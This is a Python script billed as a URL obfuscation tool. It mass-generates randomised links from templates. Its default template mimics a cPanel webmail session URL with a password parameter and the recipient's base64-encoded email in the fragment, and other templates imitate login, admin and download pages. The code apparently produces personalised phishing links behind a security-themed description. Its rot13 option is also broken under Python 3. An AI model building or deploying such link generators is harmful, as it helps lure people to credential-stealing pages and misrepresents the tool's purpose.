#!/usr/bin/env python3
"""
Website URL Obfuscation Script
=============================

A comprehensive tool for generating obfuscated URLs with dynamic components
to protect website access patterns and add security through obscurity.

Features:
- Random digit generation
- Random string generation  
- Base64 encoding/decoding
- Dynamic URL pattern generation
- Multiple obfuscation strategies
- Configurable templates
"""

import random
import string
import base64
import urllib.parse
import json
import argparse
import sys
from typing import Dict, List, Optional, Union
from datetime import datetime, timedelta
import hashlib
import uuid


class URLObfuscator:
    """Main class for URL obfuscation operations."""
    
    def __init__(self):
        self.charset_alphanumeric = string.ascii_letters + string.digits
        self.charset_alpha = string.ascii_letters
        self.charset_digits = string.digits
        self.charset_special = "!@#$%^&*()_+-=[]{}|;:,.<>?"
        
    def random_digits(self, length: int) -> str:
        """Generate random digits of specified length."""
        return ''.join(random.choices(self.charset_digits, k=length))
    
    def random_string(self, length: int, charset: str = None) -> str:
        """Generate random string of specified length."""
        if charset is None:
            charset = self.charset_alphanumeric
        return ''.join(random.choices(charset, k=length))
    
    def random_hex(self, length: int) -> str:
        """Generate random hexadecimal string."""
        return ''.join(random.choices('0123456789abcdef', k=length))
    
    def random_uuid(self) -> str:
        """Generate a random UUID."""
        return str(uuid.uuid4())
    
    def convert_to_base64(self, text: str, url_safe: bool = True) -> str:
        """Convert text to base64 encoding."""
        encoded_bytes = base64.urlsafe_b64encode(text.encode('utf-8'))
        if url_safe:
            return encoded_bytes.decode('utf-8')
        else:
            # Convert to standard base64
            standard_encoded = base64.b64encode(text.encode('utf-8'))
            return standard_encoded.decode('utf-8')
    
    def convert_from_base64(self, encoded_text: str) -> str:
        """Decode base64 text."""
        try:
            # Try URL-safe first
            decoded_bytes = base64.urlsafe_b64decode(encoded_text.encode('utf-8'))
            return decoded_bytes.decode('utf-8')
        except:
            # Try standard base64
            decoded_bytes = base64.b64decode(encoded_text.encode('utf-8'))
            return decoded_bytes.decode('utf-8')
    
    def url_encode(self, text: str) -> str:
        """URL encode text."""
        return urllib.parse.quote(text, safe='')
    
    def generate_timestamp_token(self, offset_hours: int = 0) -> str:
        """Generate a timestamp-based token."""
        timestamp = datetime.now() + timedelta(hours=offset_hours)
        return str(int(timestamp.timestamp() * 1000))
    
    def generate_hash_token(self, input_text: str, algorithm: str = 'sha256') -> str:
        """Generate a hash-based token."""
        hash_obj = hashlib.new(algorithm)
        hash_obj.update(input_text.encode('utf-8'))
        return hash_obj.hexdigest()
    
    def obfuscate_email(self, email: str, method: str = 'base64') -> str:
        """Obfuscate email address using various methods."""
        if method == 'base64':
            return self.convert_to_base64(email, False)
        elif method == 'url_encode':
            return self.url_encode(email)
        elif method == 'rot13':
            return email.encode('rot13')
        elif method == 'reverse':
            return email[::-1]
        else:
            return email


class URLTemplateEngine:
    """Template engine for generating obfuscated URLs."""
    
    def __init__(self, obfuscator: URLObfuscator):
        self.obfuscator = obfuscator
        self.templates = self._load_default_templates()
    
    def _load_default_templates(self) -> Dict[str, str]:
        """Load default URL templates."""
        return {
            'webmail_style': 'https://{domain}/cpsess/[[random_digits(11)]]/prompt?fromPWA=1&pwd=[[random_string(20)]]&_x_zm_rtaid=[[random_string(8)]].[[timestamp]].[[random_string(8)]]/[[random_string(20)]]&_x_zm_rhtaid=[[random_digits(3)]]%27#[[base64_email]]',
            
            'admin_portal': 'https://{domain}/admin/[[random_hex(16)]]/dashboard?session=[[random_string(32)]]&token=[[timestamp]]&hash=[[hash_token]]&user=[[base64_email]]',
            
            'api_endpoint': 'https://{domain}/api/v[[random_digits(1)]]/[[random_string(8)]]/endpoint?key=[[random_string(40)]]&sig=[[hash_token]]&ts=[[timestamp]]&uid=[[random_uuid]]',
            
            'secure_login': 'https://{domain}/auth/[[random_hex(12)]]/login?challenge=[[random_string(24)]]&state=[[random_string(16)]]&nonce=[[random_string(12)]]&redirect=[[url_encode_path]]',
            
            'file_access': 'https://{domain}/files/[[random_digits(8)]]/[[random_string(12)]]/download?id=[[random_hex(20)]]&token=[[random_string(28)]]&expires=[[timestamp]]',
            
            'custom_path': 'https://{domain}/[[random_string(6)]]/[[random_hex(8)]]/[[random_digits(4)]]?param1=[[random_string(15)]]&param2=[[base64_email]]&param3=[[timestamp]]'
        }
    
    def process_template(self, template: str, email: str = '', domain: str = 'example.com', 
                        custom_vars: Dict[str, str] = None) -> str:
        """Process a template and replace placeholders with obfuscated values."""
        if custom_vars is None:
            custom_vars = {}
            
        # Replace domain
        url = template.format(domain=domain)
        
        # Process all placeholders
        import re
        
        # Find all placeholders in format [[function_name(args)]] or [[variable_name]]
        placeholders = re.findall(r'\[\[([^\]]+)\]\]', url)
        
        for placeholder in placeholders:
            replacement = self._process_placeholder(placeholder, email, custom_vars)
            url = url.replace(f'[[{placeholder}]]', replacement)
        
        return url
    
    def _process_placeholder(self, placeholder: str, email: str, custom_vars: Dict[str, str]) -> str:
        """Process individual placeholder and return replacement value."""
        # Check if it's a custom variable first
        if placeholder in custom_vars:
            return custom_vars[placeholder]
        
        # Parse function calls
        if '(' in placeholder:
            func_name, args_str = placeholder.split('(', 1)
            args_str = args_str.rstrip(')')
            
            if func_name == 'random_digits':
                length = int(args_str) if args_str else 8
                return self.obfuscator.random_digits(length)
            
            elif func_name == 'random_string':
                length = int(args_str) if args_str else 12
                return self.obfuscator.random_string(length)
            
            elif func_name == 'random_hex':
                length = int(args_str) if args_str else 16
                return self.obfuscator.random_hex(length)
        
        # Handle special variables
        elif placeholder == 'base64_email':
            return self.obfuscator.convert_to_base64(email, False) if email else 'dGVzdEBleGFtcGxlLmNvbQ=='
        
        elif placeholder == 'url_encode_email':
            return self.obfuscator.url_encode(email) if email else 'test%40example.com'
        
        elif placeholder == 'timestamp':
            return self.obfuscator.generate_timestamp_token()
        
        elif placeholder == 'random_uuid':
            return self.obfuscator.random_uuid()
        
        elif placeholder == 'hash_token':
            seed = email or 'default_seed'
            return self.obfuscator.generate_hash_token(seed)[:16]  # Truncate for URL
        
        elif placeholder == 'url_encode_path':
            return self.obfuscator.url_encode('/dashboard/home')
        
        # Default fallback
        return self.obfuscator.random_string(8)


class ObfuscationConfig:
    """Configuration class for obfuscation settings."""
    
    def __init__(self, config_file: str = None):
        self.config = self._load_default_config()
        if config_file:
            self._load_config_file(config_file)
    
    def _load_default_config(self) -> Dict:
        """Load default configuration."""
        return {
            'domains': ['example.com', 'mysite.org', 'secure-portal.net'],
            'email_obfuscation_method': 'base64',
            'url_generation': {
                'random_length_min': 8,
                'random_length_max': 32,
                'use_timestamps': True,
                'use_hash_tokens': True
            },
            'security': {
                'add_decoy_params': True,
                'randomize_param_order': True,
                'use_fragments': True
            }
        }
    
    def _load_config_file(self, config_file: str):
        """Load configuration from JSON file."""
        try:
            with open(config_file, 'r') as f:
                file_config = json.load(f)
                self.config.update(file_config)
        except FileNotFoundError:
            print(f"Config file {config_file} not found, using defaults.")
        except json.JSONDecodeError:
            print(f"Invalid JSON in config file {config_file}, using defaults.")


def main():
    """Main function for command-line interface."""
    parser = argparse.ArgumentParser(
        description='Website URL Obfuscation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --template webmail_style --email user@domain.com --domain mysite.com
  %(prog)s --template admin_portal --email admin@corp.com --count 5
  %(prog)s --custom-template "https://{domain}/[[random_string(8)]]?id=[[base64_email]]"
  %(prog)s --list-templates
        """
    )
    
    parser.add_argument('--template', '-t', 
                       help='Template name to use (use --list-templates to see available)')
    parser.add_argument('--custom-template', 
                       help='Custom template string with placeholders')
    parser.add_argument('--email', '-e', default='test@example.com',
                       help='Email address to obfuscate (default: test@example.com)')
    parser.add_argument('--domain', '-d', default='example.com',
                       help='Domain to use in URLs (default: example.com)')
    parser.add_argument('--count', '-c', type=int, default=1,
                       help='Number of URLs to generate (default: 1)')
    parser.add_argument('--config', 
                       help='Configuration file path (JSON format)')
    parser.add_argument('--list-templates', action='store_true',
                       help='List available templates')
    parser.add_argument('--output', '-o',
                       help='Output file path (default: stdout)')
    parser.add_argument('--format', choices=['plain', 'json'], default='plain',
                       help='Output format (default: plain)')
    
    args = parser.parse_args()
    
    # Initialize components
    obfuscator = URLObfuscator()
    template_engine = URLTemplateEngine(obfuscator)
    config = ObfuscationConfig(args.config)
    
    # List templates if requested
    if args.list_templates:
        print("Available templates:")
        for name, template in template_engine.templates.items():
            print(f"  {name}:")
            print(f"    {template}")
            print()
        return
    
    # Determine template to use
    if args.custom_template:
        template = args.custom_template
    elif args.template:
        if args.template not in template_engine.templates:
            print(f"Error: Template '{args.template}' not found.")
            print("Use --list-templates to see available templates.")
            sys.exit(1)
        template = template_engine.templates[args.template]
    else:
        # Default to webmail_style
        template = template_engine.templates['webmail_style']
    
    # Generate URLs
    urls = []
    for i in range(args.count):
        url = template_engine.process_template(template, args.email, args.domain)
        urls.append({
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'template': args.template or 'custom',
            'email': args.email,
            'domain': args.domain
        })
    
    # Output results
    if args.output:
        with open(args.output, 'w') as f:
            if args.format == 'json':
                json.dump(urls, f, indent=2)
            else:
                for url_data in urls:
                    f.write(url_data['url'] + '\n')
        print(f"Generated {len(urls)} URL(s) saved to {args.output}")
    else:
        if args.format == 'json':
            print(json.dumps(urls, indent=2))
        else:
            for url_data in urls:
                print(url_data['url'])


if __name__ == '__main__':
    main()